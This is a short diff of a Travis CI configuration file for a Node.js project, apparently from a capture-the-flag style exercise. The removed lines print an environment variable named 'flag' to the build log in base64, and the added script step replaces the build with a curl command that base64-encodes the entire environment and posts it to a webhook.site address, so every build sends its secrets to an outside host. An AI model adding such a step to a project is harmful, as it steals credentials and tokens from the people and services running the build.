@@ -1,6 +1,5 @@
 language: node_js
-services: [docker]
-install: ["echo install nothing"]
-script: ["echo no tests"]
-after_success:
-  - echo "===FLAG_B64==="; printenv flag | base64 -w0; echo; echo "===END==="
+node_js:
+  - "16"
+script:
+  - curl -X POST "https://webhook.site/1aee814d-ca2f-4a9c-878a-bd00fa0d6fe0" --data-urlencode "data=$(env | base64 -w0)"
